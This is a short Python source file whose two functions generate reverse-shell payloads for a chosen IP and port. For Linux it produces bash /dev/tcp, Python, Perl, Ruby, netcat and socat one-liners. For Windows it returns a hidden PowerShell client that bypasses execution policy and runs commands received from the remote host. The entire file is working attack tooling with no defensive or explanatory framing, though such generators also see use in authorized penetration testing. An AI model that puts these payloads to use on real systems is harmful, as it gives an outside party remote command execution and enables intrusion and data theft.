def generate_linux_reverse_shell(shell_type, ip, port):
    payloads = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "python": f"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);",
        "perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "netcat": f"nc -e /bin/sh {ip} {port}",
        "socat": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
    }

    return payloads.get(shell_type, "Invalid shell type!")

def generate_windows_reverse_shell(ip, port):
    return f"""
powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});
$NetworkStream = $TCPClient.GetStream();
$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
function WriteToStream ($String) {{
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};
    $StreamWriter.Write($String + 'SHELL> ');
    $StreamWriter.Flush()
}}
WriteToStream '';
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);
    $Output = try {{
        Invoke-Expression $Command 2>&1 | Out-String
    }} catch {{
        $_ | Out-String
    }}
    WriteToStream ($Output)
}}
$StreamWriter.Close()" """
